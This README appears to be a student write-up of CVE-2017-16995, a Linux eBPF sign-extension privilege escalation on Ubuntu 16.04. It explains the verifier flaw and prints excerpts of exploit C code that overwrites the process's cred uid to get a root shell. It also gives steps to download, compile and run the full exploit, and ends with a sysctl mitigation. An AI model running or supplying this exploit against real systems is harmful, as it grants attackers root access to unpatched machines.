# Linux Kernel - BPF Sign Extension Local Privilege Escalation

![alt text](https://github.com/samaleyadeh/images/blob/master/DY42GCGV4AA1_8F.jpg) 

This vulnerability was caused by a bug in the linux kernel that allowed sign extension from a signed 32-bit integer to an unsigned 64-bit integer, bypassing eBPF verifier and leading to local privilege escalation. The ```check_alu_op``` function in ```kernel/bpf/verifier.c``` in the Linux kernel allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extensions.

This could occur due to the fact taht before each of the BPF program runs, two passes of verifications are conducted to ensure its correctness. The first pass ```check_cfg()``` ensures the code is loop-free using depth-first search. The second pass ```do_check()``` runs a static analysis to emulate the execution of all possible paths derived from the first instruction. The program will be terminated if any invalid instruction or memory violation is found.

In the exploit, a set of BPF instructions are carefully crafted to bypass this filtering process through an unintentional sign extension from 32 bits to 64 bits. As a result, a few lines of malicious code could be attached and get executed in the kernel space, resulting in a hack refered to as privilege escalation explained below. 

This vulnerability allowed attacker to have full control of the system with root access. The low complexity of the attack and low privileges required to perform this exploit made it high priority. 

It affected specific versions of linux based system, but given that Ubuntu has a large number of users around the world, especially public cloud users, the vulnerability had the potetional to cause diruptions at a significant scale for both corporate and individual users.

### [Vulnerability Overview and Impact](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)
Linux Kernel Version: 4.14 - 4.4 (mainly Ubuntu and Debian)

CVSS v3 Score: 7.8 (Severity: high)

Confidentiality: High

Integrity: High

Authority: High

![alt text](https://github.com/samaleyadeh/images/blob/master/zero-day-attack-1024x413.jpg) 

Zero day exploits a well known category of hacks is one of the most popular hacks due to thier pervasive nature. This is due to it's wide range of effects and long repair period. A prime example of this happened On 5 PM,15/Mar/2018, when a security researcher Vitaly Nikolenko published a Ubuntu 16.04 kernel [zeroday exploit](http://cyseclabs.com/exploits/upstream44.c) on [twitter](https://twitter.com/vnik5287/status/974439706896187392), that can be used to directly get the highest privilege (root) of Ubuntu.

The vulnerability only affects specific versions, but given that Ubuntu has a large number of users around the world, especially public cloud users, the vulnerability is still a small risk for both corporate and individual users.



## [What is Sign Extension?](https://en.wikipedia.org/wiki/Sign_extension)

Is a simple process by wich the represetnation of a value in memory is changed from a lower number of bits to a higher number of bits while preserving its content and sign in the process as illistrated in the figure above

![alt text](https://github.com/samaleyadeh/images/blob/master/sign-extension.jpg) 


## [What is Privilege Escalation](https://en.wikipedia.org/wiki/Privilege_escalation)
![alt text](https://github.com/samaleyadeh/images/blob/master/300px-Priv_rings.svg.png?raw=true) 

In this form of attacks the aim is to raise the abilities and access of the attacker from the intrusion level to higher abilites with the ultimate goal of gaining root access.

## [What is BPF?](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)

![alt text](https://github.com/samaleyadeh/images/blob/master/bpf.png)

As you may know, the user layer and kernel layer of Linux are isolated. If you want the kernel to execute the user's code, you need to write the kernel module which can only be loaded by the root user. The BPF (Berkeley Packet Filter) provides a bridge between code and data transfer between the user and the kernel. The user can use the eBPF instruction bytecode to deliver code to the kernel, and trigger the kernel to execute the user-provided code through events (such as writing data to the socket), and share the data with the kernel in the form of map (key - value). The user layer writes data to the map, and the kernel layer fetches data from the map, and vice versa. 
The original intention of BPF is to filter the network at the bottom, and later it can easily inject code into the kernel. It is widely used for packet capture, kernel probe, Performance monitoring and other fields. 
eBPF virtual instruction system
The eBPF virtual instruction system belongs to Reduced Instruction Set Computer (RISC) and has 10 64-bit virtual registers, r0-r10. r0 stores the return value, r1 to r5 is reserved for arguments, r6 to r9 is reserved for storing callee saved registers and r10 stores read-only frame pointer. In actual operation, the virtual machine corresponds these 10 registers to the 10 physical registers of the hardware CPU: R0 - rax, R1 - rdi , R2 - rsi , R3 - rdx , R4 - rcx , R5 - r8 , R6 - rbx , R7 - r13 , R8 - r14 , R9 - r15 , R10 – rbp(frame pointer).
Each BPF instruction on x64 platform is of 64-bit long. The format of each instruction is as follows:


```C
Struct bpf_insn { 
    __u8 code;         /* opcode */ 
    __u8 dst_reg: 4 ;     /* dest register */ 
    __u8 src_reg: 4 ;     /* source register */ 
    __s16 off;         /* signed offset */ 
    __s32 imm;         /* signed immediate constant */ 
};
```
For example, a simple x86 assignment instruction: mov eax, 0xffffffff, the corresponding BPF instruction is: BPF_MOV32_IMM (BPF_REG_2, 0xFFFFFFFF), and its corresponding data structure is:


```C

#define BPF_MOV32_IMM(DST, IMM) \ 
    (( struct bpf_insn) { \ 
        .code   = BPF_ALU | BPF_MOV | BPF_K, \ 
        .dst_reg = DST, \ 
        .src_reg = 0 , \ 
        .off    = 0 , \ 
        .imm    = IMM })

```
Its value in memory is: ``` \xb4\x09\x00\x00\xff\xff\xff\xff ```

In conclusion, 
1. eBPF virtual instruction system is a RISC instruction system, that is, each instruction size is the same; 
2. Its virtual 10 registers correspond 10 physical cpu registers, and the function is similar. For example, the r10 register of the BPF and the rbp point to the stack, and r0 is used for the return value.

The exploit is comprised of two parts: 
1. An eBPF filter programming runs in the kernel 
2. A helper program runs in the user space. 


The attack can be generalized into the following steps:
1. exploit.c creates a eBPF map of size 3 using bpf_creat_map() and loads the eBPF instructions char *prog into the kernel using bpf_prog_load().

2. The eBPF instructions serve as an agent which takes commands from the map and perform read/write in the kernel space accordingly.

| Index of eBPF map        	| To read fromkernel       | current frame pointer  	|To write to kernel |
| ------------------------------|:-----------------------: | --------------------------:| -----------------:|
| 0 (opcode)      		| 0		           | 1	 			|2		    |
| 1 (address)      		| Target address       	   | 0				|Target address	    |
| 2 (value)	 		| (Content at the address) | 0				|0		    |

3. After applying for map, the program beings by sending the instruction to get the kernel stack address using bpf_update_elem()., as follows:

```C
#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg(); 
```

It  then calls writemsg() and sends a few dummy packets to the socket to trigger a read/write operation and force the eBPF program to run.

4. At this point, the current frame pointer can be obtained by instructing the BPF program to perform opcode 1. The return value is stored in the map at index 2. After obtaining the frame pointer, it will be used to find the pointer of task_struct in the kernel stack.

```C
uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);
```
5. After getting the task_struct address, plus the cred offset CRED_OFFSET=0x3f0 (due to the kernel, it may cause the cred offset in the task_struct is different) then the address given to Bpf_update_elem() would be:

```C
Bpf_update_elem(0, 2); 
Bpf_update_elem(1, task_struct address + CRED_OFFSET address);
Bpf_update_elem(2, 0);
```

6. Using the address of task_struct, we will be able to obtain the address of struct cred base as it is part of task_struct. In the struct cred, there will be a uid_t uid which can be set to 0 base on the offset from the address of struct cred. When this uid is set to 0, the process will be able to run its program with root privileges.

```C
	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}
```

## Reproducing the vulnerability

1. Install Ubuntu16.04 on Virtualbox
Download from: http://old-releases.ubuntu.com/releases/16.04.0/ 

version downloaded by me: ubuntu-16.04.3-server-i386.iso

2. Change to another version

```sudo apt-get install linux-headers-4.4.0.116-generic linux-image-4.4.0.116-generic```

![alt text](https://github.com/samaleyadeh/images/blob/master/4-2.png) 


3. Edit “grub.cfg” to make sure the linux version has been changed

```nano /boot/grub/grub.cfg```

![alt text](https://github.com/samaleyadeh/images/blob/master/4-3.png) 


4. Reboot, download and compile the code.

```sudo apt-get install gcc```

```wget https://raw.githubusercontent.com/LiYangHart/Hacking_Project2/master/upstream44.c```

![alt text](https://github.com/samaleyadeh/images/blob/master/4-4.png) 


```gcc –o test upstream44.c```

```./test```

![alt text](https://github.com/samaleyadeh/images/blob/master/5-1.png) 


```id```

![alt text](https://github.com/samaleyadeh/images/blob/master/5-2.png) 


## Fixing the vulnerability
The users can limit the use of bpf system calls to restrict ordinary users by modifying kernel parameters:
Set the parameter ```kernel.unprivileged_bpf_disabled = 1``` to prevent this privilege escalation by restricting access to bpf.

```echo 1 > /proc/sys/kernel/ unprivileged_bpf_disabled```

![alt text](https://github.com/samaleyadeh/images/blob/master/5-3.png) 

we can run the exploit again with the privileges of a normal user to check the if the exploit is there or not. as shown in the figure.

![alt text](https://github.com/samaleyadeh/images/blob/master/5-4.png) 

